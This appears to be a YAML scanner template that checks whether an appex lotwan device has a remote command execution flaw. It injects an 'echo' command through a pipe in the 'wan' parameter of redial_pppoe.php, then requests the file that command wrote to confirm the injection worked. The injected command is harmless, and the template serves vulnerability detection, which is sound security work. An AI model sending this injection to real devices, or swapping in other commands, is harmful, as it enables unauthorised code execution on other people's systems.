name: yaml-poc-appex-lotwan-rce-CT-605690
binding: f52f66d5-7de7-42b4-b33f-f5c567578396
detail:
    author: haiqing.chen
    vulnerability:
        id: cd5f3ded-6f5f-487f-ae7b-91508cca3873
        level: critical
    warning: Harmless
transport: http
set:
    r1: randomInt(100000, 999999)
    r2: randomInt(100000, 999999)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /acc/network/redial_pppoe.php?wan=a|echo%20{{r1}}>{{r2}}.txt||
        expression: response.status == 200
    r1:
        request:
            cache: true
            method: GET
            path: /acc/network/{{r2}}.txt
        expression: response.status == 200 && response.body_string.contains(string(r1))
expression: r0() && r1()
